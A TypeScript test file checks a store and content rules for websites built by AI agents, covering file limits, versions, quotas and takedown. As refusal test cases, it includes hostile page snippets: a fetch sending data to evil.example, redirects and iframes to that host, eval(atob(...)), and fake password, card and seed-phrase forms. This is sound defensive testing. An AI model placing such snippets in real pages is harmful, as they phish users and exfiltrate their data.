// Agents that build, phase 0: the store for what an agent built and its rules. What a site may be made of, what a
// built page may never be, versions, limits, and taking one down.
import { describe, it, expect, beforeEach } from "vitest";
import { getDb } from "@/lib/db";
import {
  addVersion, agentBuilds, checkFiles, cleanPath, createSite, filesOf, fingerprint, getSite, hideSite, kindOf, neverIn, reportSite, reportedSites,
  restoreSite, showVersion, siteLimits, siteOfTask, siteStats, sitesEnabled, sitesOf, storeBytes, versionsOf, type SiteFileIn,
} from "@/lib/agentSites";

beforeEach(() => { getDb().exec("DELETE FROM built_site_reports; DELETE FROM built_site_files; DELETE FROM built_site_versions; DELETE FROM built_sites;"); });

const page = (body = "<h1>Tip calculator</h1>"): SiteFileIn => ({ path: "index.html", content: `<!doctype html><html><head><title>Tips</title></head><body>${body}</body></html>` });
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(40, 1)]);
const made = (o: Partial<{ taskId: string; ownerMark: string | null; title: string }> = {}) => {
  const m = createSite({ taskId: o.taskId ?? "t1", agentId: "agent-1", ownerMark: o.ownerMark === undefined ? "0xabc" : o.ownerMark, title: o.title ?? "Tip calculator" });
  if (!m.ok) throw new Error(m.why);
  return m.site;
};
const problems = (files: SiteFileIn[]) => { const c = checkFiles(files); return c.ok ? [] : c.problems; };

describe("the switch", () => {
  it("is off unless AGENT_SITES is on, and then only for an agent Axon runs itself", () => {
    expect(sitesEnabled({})).toBe(false);
    expect(sitesEnabled({ AGENT_SITES: " ON " })).toBe(true);
    expect(sitesEnabled({ AGENT_SITES: "yes" })).toBe(false);
    const on = { AGENT_SITES: "on" };
    expect(agentBuilds({}, { env: on })).toBe(true);
    expect(agentBuilds({ provider: "anthropic" }, { env: on })).toBe(true);
    expect(agentBuilds({ provider: "openrouter" }, { env: on })).toBe(false);
    expect(agentBuilds({ endpoint: "https://a.example/agent" }, { env: on })).toBe(false);
    expect(agentBuilds({ orchestrator: { steps: [] } }, { env: on })).toBe(false);
    expect(agentBuilds({}, { env: on, viaMcp: true })).toBe(false);
    expect(agentBuilds({}, { env: {} })).toBe(false);
  });

  it("has limits a deployment can set, and ignores a value out of range", () => {
    expect(siteLimits({})).toEqual({ files: 12, fileBytes: 300 * 1024, totalBytes: 1024 * 1024, versions: 20, perOwnerDay: 10, storeMegabytes: 300, reportsToHide: 3 });
    expect(siteLimits({ AXON_SITE_MAX_FILES: "5", AXON_SITE_PER_DAY: "2" })).toMatchObject({ files: 5, perOwnerDay: 2 });
    expect(siteLimits({ AXON_SITE_MAX_FILES: "0", AXON_SITE_FILE_KB: "lots", AXON_SITE_VERSIONS: "9999" })).toMatchObject({ files: 12, fileBytes: 300 * 1024, versions: 20 });
  });
});

describe("what a site is made of", () => {
  it.each([["index.html", "index.html"], ["./style.css", "style.css"], ["/js/app.js", "js/app.js"], ["img/icons/star.svg", "img/icons/star.svg"], ["data.v2.json", "data.v2.json"]])("keeps the file name %s as %s", (raw, kept) => {
    expect(cleanPath(raw)).toBe(kept);
  });

  it.each(["", " ", "../secret.html", "a/../b.html", "Index.html", ".env", "a/.hidden", "a b.html", "a/b/c/d.html", "x".repeat(90) + ".html", "http://evil.example/x.js", "a\\b.html", "a//b.html", "index.html?x=1", 5, null])("refuses the file name %s", (raw) => {
    expect(cleanPath(raw)).toBeNull();
  });

  it("decides what a file is from its name and its bytes together", () => {
    expect(kindOf("index.html", Buffer.from("<p>hi</p>"))).toBe("text/html");
    expect(kindOf("app.js", Buffer.from("let a = 1;"))).toBe("text/javascript");
    expect(kindOf("logo.png", PNG)).toBe("image/png");
    expect(kindOf("icon.svg", Buffer.from("<svg xmlns='http://www.w3.org/2000/svg'/>"))).toBe("image/svg+xml");
    // a picture's name on something that is not one, a text name on bytes, and kinds a site never holds
    expect(kindOf("logo.png", Buffer.from("<script>alert(1)</script>"))).toBeNull();
    expect(kindOf("page.html", Buffer.from([0x4d, 0x5a, 0x00, 0x03]))).toBeNull();
    for (const name of ["run.exe", "a.zip", "a.php", "a.wasm", "a.pdf", "noextension"]) expect(kindOf(name, Buffer.from("x"))).toBeNull();
  });

  it("takes a small site whole, and says everything that is wrong with one it will not take", () => {
    const ok = checkFiles([page(), { path: "style.css", content: "body{font:16px system-ui}" }, { path: "logo.png", content: PNG }]);
    expect(ok.ok && ok.files.map((f) => [f.path, f.mime])).toEqual([["index.html", "text/html"], ["logo.png", "image/png"], ["style.css", "text/css"]]);
    expect(problems([])).toEqual(["a site needs at least index.html"]);
    expect(problems([{ path: "about.html", content: "<p>about</p>" }])).toEqual(["a site needs a file called index.html: it is the page that opens"]);
    expect(problems([page(), page()])).toEqual(["index.html is there twice"]);
    expect(problems([page(), { path: "empty.css", content: "" }, { path: "../up.js", content: "1" }, { path: "tool.exe", content: "MZ" }]).length).toBe(3);
    expect(problems([page(), { path: "big.js", content: "x".repeat(300 * 1024 + 1) }])[0]).toMatch(/big\.js is 301 KB: one file is at most 300 KB/);
    expect(problems(Array.from({ length: 13 }, (_, i) => (i === 0 ? page() : { path: `p${i}.html`, content: "<p>x</p>" })))[0]).toMatch(/at most 12 files: this one has 13/);
    const heavy = [page(), ...Array.from({ length: 4 }, (_, i) => ({ path: `d${i}.json`, content: `"${"x".repeat(290 * 1024)}"` }))];
    expect(problems(heavy).join(" ")).toMatch(/together: a site is at most 1024 KB/);
  });

  it("gives a version one fingerprint, the same whatever order its files came in, and another when a byte changes", () => {
    const a = checkFiles([page(), { path: "style.css", content: "a{}" }]), b = checkFiles([{ path: "style.css", content: "a{}" }, page()]), c = checkFiles([page(), { path: "style.css", content: "a{ }" }]);
    if (!a.ok || !b.ok || !c.ok) throw new Error("the sites should be fine");
    expect(fingerprint(a.files)).toBe(fingerprint(b.files));
    expect(fingerprint(a.files)).not.toBe(fingerprint(c.files));
    expect(fingerprint(a.files)).toMatch(/^[0-9a-f]{64}$/);
  });
});

describe("what a built page may never be", () => {
  const never = (html: string, extra: SiteFileIn[] = []) => neverIn([{ path: "index.html", content: Buffer.from(html) }, ...extra.map((f) => ({ path: f.path, content: Buffer.from(String(f.content)) }))]);

  it("lets ordinary pages through: a calculator, a quiz, a landing page with links, a password maker", () => {
    expect(never('<h1>Tip</h1><input id="bill" type="number"><button onclick="calc()">Split</button><script>function calc(){document.getElementById("out").textContent=1}</script>')).toEqual([]);
    expect(never('<h1>Launch day</h1><p>Read more at <a href="https://example.com/docs">the docs</a>.</p><img src="data:image/png;base64,AAAA">')).toEqual([]);
    expect(never('<h1>Password maker</h1><label>Length <input type="number" value="16"></label><output id="pw"></output><script>crypto.getRandomValues(new Uint8Array(16))</script>')).toEqual([]);
    expect(never("<h1>Keep your recovery phrase offline</h1><p>Never type a private key into a website.</p>")).toEqual([]);
  });

  it.each([
    ['<input type="password" name="pw">', /password or a card/],
    ['<input autocomplete="cc-number">', /password or a card/],
    ['<label>Enter your 12-word recovery phrase</label><textarea></textarea>', /never asks for a secret/],
    ['<p>Private key</p><input type="text">', /never asks for a secret/],
    ['<input placeholder="Card number"><input placeholder="CVV">', /never asks for a secret/],
    ['<button onclick="window.ethereum.request({method:\'eth_requestAccounts\'})">Connect</button>', /talks to a wallet/],
    ['<script>const p = new ethers.BrowserProvider(x)</script>', /talks to a wallet/],
    ['<h1>MetaMask</h1><p>Unlock to continue</p><input type="text">', /another company's sign-in/],
    ['<iframe src="https://evil.example"></iframe>', /one document of its own/],
    ['<base href="https://evil.example/">', /one document of its own/],
    ['<meta http-equiv="refresh" content="0;url=https://evil.example">', /one document of its own/],
    ["<script>top.location = 'https://evil.example'</script>", /stays inside its own frame/],
    ["<script>window.opener.postMessage(1,'*')</script>", /stays inside its own frame/],
    ['<script src="https://cdn.example/lib.js"></script>', /from another site/],
    ['<link rel="stylesheet" href="//cdn.example/a.css">', /from another site/],
    ["<style>@import url('https://fonts.example/a.css');</style>", /from another site/],
    ["<script>fetch('https://evil.example/?d=' + data)</script>", /calls out over the network/],
    ["<script>new WebSocket('wss://evil.example')</script>", /calls out over the network/],
    ["<script>navigator.sendBeacon('/x', d)</script>", /calls out over the network/],
    ["<script>eval(atob(s))</script>", /builds code from text/],
    ["<script>document.write('<script>')</script>", /builds code from text/],
  ])("refuses %s", (html, why) => {
    const found = never(html);
    expect(found.length).toBeGreaterThan(0);
    expect(found.join(" ")).toMatch(why);
    expect(found[0].startsWith("index.html: ")).toBe(true);
  });

  it("looks in every script and picture a page is made of, not only the page", () => {
    expect(never("<h1>ok</h1>", [{ path: "app.js", content: "fetch('/api/tasks')" }])[0]).toMatch(/^app\.js: it calls out/);
    expect(never("<h1>ok</h1>", [{ path: "art.svg", content: "<svg><script>top.location='x'</script></svg>" }])[0]).toMatch(/^art\.svg: /);
    // a secret asked for on one page counts, wherever the words are
    expect(never('<a href="restore.html">Restore</a>', [{ path: "restore.html", content: "<p>Seed phrase</p><textarea></textarea>" }]).join(" ")).toMatch(/never asks for a secret/);
  });

  it("keeps nothing of a site that breaks a rule", () => {
    const site = made();
    const kept = addVersion(site.siteId, [page('<input type="password">')], { taskId: "t1" });
    expect(kept).toMatchObject({ ok: false });
    expect(getSite(site.siteId)!.version).toBe(0);
    expect(filesOf(site.siteId)).toEqual([]);
    expect(storeBytes()).toBe(0);
  });
});

describe("the store", () => {
  it("keeps what was built under a name nobody can guess, for whoever hired the agent", () => {
    const a = made(), b = made({ taskId: "t2" });
    expect(a.siteId).toMatch(/^[A-Za-z0-9_-]{16}$/);
    expect(a.siteId).not.toBe(b.siteId);
    expect(a).toMatchObject({ taskId: "t1", agentId: "agent-1", ownerMark: "0xabc", title: "Tip calculator", status: "live", version: 0 });
    expect(siteOfTask("t2")?.siteId).toBe(b.siteId);
    expect(siteOfTask("nope")).toBeNull();
    expect(sitesOf("0xabc").map((s) => s.siteId).sort()).toEqual([a.siteId, b.siteId].sort());
    expect(sitesOf("0xother")).toEqual([]);
    expect(made({ taskId: "t3", title: `  ${"T".repeat(200)}\n` }).title.length).toBe(80);
  });

  it("every change is a new version, the old ones stay, and an earlier one can be shown again", () => {
    const site = made();
    const v1 = addVersion(site.siteId, [page("<h1>One</h1>")], { taskId: "t1", note: "a tip calculator" });
    const v2 = addVersion(site.siteId, [page("<h1>Two</h1>"), { path: "style.css", content: "h1{color:#111}" }], { taskId: "t9", note: "make the heading darker", title: "Tips, darker" });
    expect(v1).toMatchObject({ ok: true, version: 1, files: 1 });
    expect(v2).toMatchObject({ ok: true, version: 2, files: 2 });
    expect(getSite(site.siteId)).toMatchObject({ version: 2, title: "Tips, darker" });
    expect(filesOf(site.siteId).map((f) => f.path)).toEqual(["index.html", "style.css"]);
    expect(filesOf(site.siteId, 1)[0].content.toString()).toContain("<h1>One</h1>");
    expect(versionsOf(site.siteId).map((v) => [v.version, v.taskId, v.note, v.files])).toEqual([[2, "t9", "make the heading darker", 2], [1, "t1", "a tip calculator", 1]]);
    expect(v1.ok && v2.ok && v1.sha256 !== v2.sha256).toBe(true);
    expect(showVersion(site.siteId, 1)).toBe(true);
    expect(filesOf(site.siteId)[0].content.toString()).toContain("<h1>One</h1>");
    expect(versionsOf(site.siteId)).toHaveLength(2);
    expect(showVersion(site.siteId, 7)).toBe(false);
    // the next change after going back is version 3, not a second version 2
    expect(addVersion(site.siteId, [page("<h1>Three</h1>")], { taskId: "t10" })).toMatchObject({ ok: true, version: 3 });
  });

  it("keeps only so many versions, the oldest going first", () => {
    const site = made();
    const limits = { ...siteLimits({}), versions: 3 };
    for (let i = 1; i <= 5; i++) addVersion(site.siteId, [page(`<h1>${i}</h1>`)], { taskId: "t1" }, limits);
    expect(versionsOf(site.siteId).map((v) => v.version)).toEqual([5, 4, 3]);
    expect(filesOf(site.siteId, 1)).toEqual([]);
    expect(filesOf(site.siteId)[0].content.toString()).toContain("<h1>5</h1>");
  });

  it("gives a person a daily allowance of new sites, and a job without a mark its own", () => {
    const limits = { ...siteLimits({}), perOwnerDay: 2 };
    const one = (taskId: string, ownerMark: string | null) => createSite({ taskId, agentId: "a", ownerMark, title: "x" }, limits);
    expect(one("t1", "0xabc").ok).toBe(true);
    expect(one("t2", "0xabc").ok).toBe(true);
    expect(one("t3", "0xabc")).toMatchObject({ ok: false, why: expect.stringMatching(/2 sites built in the last day/) });
    expect(one("t4", "0xother").ok).toBe(true);
    expect(one("t5", null).ok).toBe(true);
    expect(one("t5", null).ok).toBe(true);
    expect(one("t5", null).ok).toBe(false);
    expect(one("t6", null).ok).toBe(true);
    // yesterday's do not count
    getDb().prepare("UPDATE built_sites SET created_at = ? WHERE owner_mark = '0xabc'").run(new Date(Date.now() - 2 * 86_400_000).toISOString());
    expect(one("t7", "0xabc").ok).toBe(true);
  });

  it("stops at the store's ceiling", () => {
    const tiny = { ...siteLimits({}), storeMegabytes: 1 };
    const site = made();
    expect(addVersion(site.siteId, [page(), { path: "d1.json", content: `"${"x".repeat(290 * 1024)}"` }, { path: "d2.json", content: `"${"y".repeat(290 * 1024)}"` }, { path: "d3.json", content: `"${"z".repeat(290 * 1024)}"` }], { taskId: "t1" }, tiny).ok).toBe(true);
    expect(addVersion(site.siteId, [page(), { path: "d1.json", content: `"${"x".repeat(290 * 1024)}"` }], { taskId: "t1" }, tiny)).toMatchObject({ ok: false, problems: [expect.stringMatching(/Nothing was changed/)] });
    // under the ceiling a new site can still be started; at it, none can
    expect(createSite({ taskId: "t2", agentId: "a", ownerMark: "0xnew", title: "x" }, tiny)).toMatchObject({ ok: true });
    getDb().prepare("UPDATE built_site_files SET bytes = ?").run(2 * 1024 * 1024);
    expect(createSite({ taskId: "t3", agentId: "a", ownerMark: "0xnew", title: "x" }, tiny)).toMatchObject({ ok: false, why: expect.stringMatching(/Nothing was built/) });
  });

  it("answers for a site that is not there", () => {
    expect(getSite("nope")).toBeNull();
    expect(addVersion("nope", [page()], { taskId: "t1" })).toEqual({ ok: false, problems: ["there is no such site"] });
    expect(filesOf("nope")).toEqual([]);
    expect(versionsOf("nope")).toEqual([]);
  });
});

describe("taking a built page down", () => {
  it("hides it at once: it shows nothing and cannot be changed, and nothing is deleted", () => {
    const site = made();
    addVersion(site.siteId, [page()], { taskId: "t1" });
    expect(hideSite(site.siteId, "moderator: a fake giveaway")).toBe(true);
    expect(getSite(site.siteId)).toMatchObject({ status: "hidden", hiddenReason: "moderator: a fake giveaway" });
    expect(filesOf(site.siteId)).toEqual([]);
    expect(filesOf(site.siteId, 1)).toEqual([]);
    expect(addVersion(site.siteId, [page("<h1>again</h1>")], { taskId: "t2" })).toEqual({ ok: false, problems: ["this site was taken down and cannot be changed"] });
    expect(showVersion(site.siteId, 1)).toBe(false);
    expect(hideSite(site.siteId, "twice")).toBe(false);
    expect(versionsOf(site.siteId)).toHaveLength(1);
    expect(restoreSite(site.siteId)).toBe(true);
    expect(filesOf(site.siteId)).toHaveLength(1);
    expect(restoreSite(site.siteId)).toBe(false);
  });

  it("counts one person once, and hides the page when enough different people have reported it", () => {
    const site = made();
    addVersion(site.siteId, [page()], { taskId: "t1" });
    expect(reportSite(site.siteId, { reason: "scam", details: "asks for money", reporter: "ip:1.1.1.1" })).toEqual({ ok: true, reports: 1, hidden: false });
    expect(reportSite(site.siteId, { reason: "scam", reporter: "ip:1.1.1.1" })).toEqual({ ok: true, reports: 1, hidden: false });
    expect(reportSite(site.siteId, { reason: "not a reason", reporter: "ip:2.2.2.2" })).toEqual({ ok: true, reports: 2, hidden: false });
    expect(getSite(site.siteId)!.status).toBe("live");
    expect(reportSite(site.siteId, { reason: "impersonation", reporter: "ip:3.3.3.3" })).toEqual({ ok: true, reports: 3, hidden: true });
    expect(getSite(site.siteId)).toMatchObject({ status: "hidden", hiddenReason: "reported by 3 people" });
    expect(filesOf(site.siteId)).toEqual([]);
    expect(reportSite("nope", { reason: "scam", reporter: "x" })).toEqual({ ok: false, reports: 0, hidden: false });
    // who reported is kept only as a hash
    const rows = getDb().prepare("SELECT reporter_hash, reason FROM built_site_reports ORDER BY id").all() as { reporter_hash: string; reason: string }[];
    expect(rows.map((r) => r.reason)).toEqual(["scam", "other", "impersonation"]);
    expect(rows.every((r) => /^[0-9a-f]{64}$/.test(r.reporter_hash) && !r.reporter_hash.includes("1.1.1.1"))).toBe(true);
  });

  it("shows a moderator what was reported and what is down, and a restored page does not go down on the same reports", () => {
    const a = made(), b = made({ taskId: "t2" }), c = made({ taskId: "t3" });
    for (const s of [a, b, c]) addVersion(s.siteId, [page()], { taskId: s.taskId });
    reportSite(a.siteId, { reason: "scam", reporter: "1" });
    for (const r of ["1", "2", "3"]) reportSite(b.siteId, { reason: "harmful", reporter: r });
    const list = reportedSites();
    expect(list.map((x) => [x.site.siteId, x.reports, x.site.status])).toEqual([[b.siteId, 3, "hidden"], [a.siteId, 1, "live"]]);
    expect(list[0].reasons).toEqual(["harmful"]);
    expect(siteStats()).toMatchObject({ sites: 3, live: 2, hidden: 1, versions: 3, reported: 2 });
    restoreSite(b.siteId);
    expect(reportedSites().map((x) => x.site.siteId)).toEqual([a.siteId]);
    expect(reportSite(b.siteId, { reason: "harmful", reporter: "1" })).toEqual({ ok: true, reports: 1, hidden: false });
  });
});
